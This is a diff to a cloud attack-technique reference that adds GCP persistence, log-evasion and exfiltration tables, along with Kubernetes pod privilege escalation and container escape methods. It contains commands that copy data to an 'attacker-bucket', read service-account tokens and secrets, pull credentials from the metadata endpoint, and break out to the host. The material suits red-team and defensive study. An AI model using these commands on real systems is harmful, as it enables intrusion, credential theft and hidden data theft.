@@ -141,6 +141,100 @@ Cloud providers secure the **infrastructure** (hardware, hypervisor, physical fa
 | Custom role iam.roles.update | `iam.roles.update` on own custom role | Add permissions (e.g., `iam.serviceAccounts.actAs`, `resourcemanager.projects.setIamPolicy`) to attacker-controlled custom role | gcloud |
 | Service Account Token Creator | `iam.serviceAccounts.getAccessToken` (Token Creator role) | Call `generateAccessToken` to impersonate any service account in the project | gcloud, custom script |
 
+### Persistence
+
+| Technique | Description |
+|---|---|
+| New service account with JSON key | Create a service account and generate a JSON key; the key persists even if the originating user account is removed |
+| Add key to existing high-priv service account | Add a new key to a high-privilege service account to maintain secondary access alongside legitimate credentials |
+| Cloud Function backdoor | Deploy or modify a Cloud Function with an HTTP or Pub/Sub trigger to maintain persistent code execution capability |
+| Cloud Scheduler job | Create a Cloud Scheduler job that invokes an attacker-controlled Cloud Run service or Cloud Function on a recurring schedule |
+| Organization-level IAM binding | If `resourcemanager.organizations.setIamPolicy` is accessible, add a persistent privileged role binding at the org level — survives project deletion |
+
+### Defense Evasion
+
+| Technique | Description |
+|---|---|
+| Disable audit logging sinks | Remove or modify Cloud Logging export sinks to stop log forwarding to SIEM, BigQuery, or GCS |
+| Create log exclusion filter | Add a Log Router exclusion that suppresses specific API calls (e.g., `SetIamPolicy`, `CreateServiceAccountKey`) from being written to logs |
+| Operate via Cloud Shell | Actions taken in Cloud Shell may blend with routine developer activity in audit logs |
+| Service account impersonation chaining | Chain `generateAccessToken` calls through multiple service accounts to obscure the originating identity across log entries |
+
+### Data Exfiltration
+
+| Technique | Command |
+|---|---|
+| GCS bucket sync | `gsutil cp -r gs://victim-bucket gs://attacker-bucket` — bulk copy to attacker-controlled GCS bucket |
+| BigQuery table export | `bq extract --destination_format NEWLINE_DELIMITED_JSON project:dataset.table gs://attacker-bucket/dump.json` |
+| Cloud SQL export | `gcloud sql export sql INSTANCE gs://attacker-bucket/dump.sql --database=DB` |
+| Secret Manager bulk read | `gcloud secrets versions access latest --secret=SECRET_NAME` for all accessible secrets |
+
+---
+
+## 4b. Container & Kubernetes Attack Techniques
+
+Container and Kubernetes environments are frequently deployed in cloud providers and present their own attack surface that spans cloud IAM, the cluster control plane, and the container runtime. Kubernetes attacks often begin with a compromised application running in a pod and escalate outward to the cluster and then to the underlying cloud account.
+
+### Why Kubernetes Is Targeted
+
+- **RBAC misconfigurations** — Overly permissive ClusterRoles, wildcard permissions, and unguarded `cluster-admin` bindings allow privilege escalation from a single compromised pod to full cluster control
+- **Default service account token auto-mount** — Pods receive a mounted service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token` by default; if the pod is compromised, this token can call the Kubernetes API with the pod service account's permissions
+- **Cloud metadata server access** — Pods can reach `169.254.169.254` unless the node blocks it, allowing the pod to steal the underlying cloud IAM role credentials (EC2 instance profile, Azure managed identity, GCP service account)
+- **Misconfigured kubelet API** — The kubelet's read-only port (10255) or unauthenticated exec port (10250) can expose cluster internals and allow command execution without authorization
+
+### Initial Access
+
+| Technique | Description | ATT&CK ID |
+|---|---|---|
+| Exploit vulnerable container app | RCE in a containerized web application grants a foothold inside the pod | T1190 |
+| Exposed Kubernetes API server | `kubectl` access via an unauthenticated or public API server endpoint | T1133 |
+| Malicious container image from registry | Backdoored or typosquatted image pulled from Docker Hub or a public registry | T1195.002 |
+| Exposed kubelet port (10250) | Unauthenticated `/run` endpoint on kubelet allows arbitrary command execution in running pods | T1133 |
+| Compromised CI/CD pipeline | Malicious job in a CI/CD pipeline has access to `KUBECONFIG` or cluster service account tokens | T1195 |
+
+### Privilege Escalation from Inside a Pod
+
+```bash
+# Enumerate service account token from within a running pod
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+APISERVER=https://kubernetes.default.svc
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# List all namespaces (tests scope of the token)
+curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
+
+# Check what this token can do
+kubectl --token=$TOKEN --certificate-authority=$CACERT --server=$APISERVER auth can-i --list
+
+# Read secrets (if allowed)
+curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/default/secrets
+```
+
+| Technique | Description |
+|---|---|
+| Privileged pod deployment | Create a pod with `securityContext.privileged: true` — grants full access to the host kernel |
+| `hostPath: /` mount | Mount the host root filesystem; read `/etc/shadow`, write cron jobs, modify kubeconfig |
+| `hostPID` or `hostNetwork` | Access host process list or host network stack — enables ARP poisoning and process injection from a pod |
+| Node service account | A pod running as `system:node` can read secrets for pods scheduled on the same node |
+| `create roles` / `bind roles` RBAC abuse | Service account with `create` on `(cluster)rolebindings` can grant `cluster-admin` to an attacker-controlled account |
+| Steal cloud IAM via IMDS | From a pod without metadata block: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
+
+### Container Escape Techniques
+
+| Technique | Command / Method |
+|---|---|
+| Privileged container + `nsenter` | `nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash` enters the host PID 1 namespace |
+| Docker socket mount escape | If `/var/run/docker.sock` is mounted: `docker run -v /:/host --privileged alpine chroot /host` |
+| Writable hostPath + cron | Write a reverse shell to a host cron directory via a mounted `hostPath`; wait for host execution |
+| Kernel exploit from container | Use a kernel CVE (e.g., Dirty Cow, Dirty Pipe) from inside a non-privileged container for host root |
+| `runc` CVE-2019-5736 | Overwrite host `runc` binary from inside a container during `docker exec`; achieves host code execution |
+
+**Key tools:** [kube-hunter](https://github.com/aquasecurity/kube-hunter) · [CDK](https://github.com/cdk-team/CDK) · [kube-bench](https://github.com/aquasecurity/kube-bench) · [BadPods](https://github.com/BishopFox/badpods) · [KubeSec](https://kubesec.io/)
+
 ---
 
 ## 5. Key Cloud Attack Tools
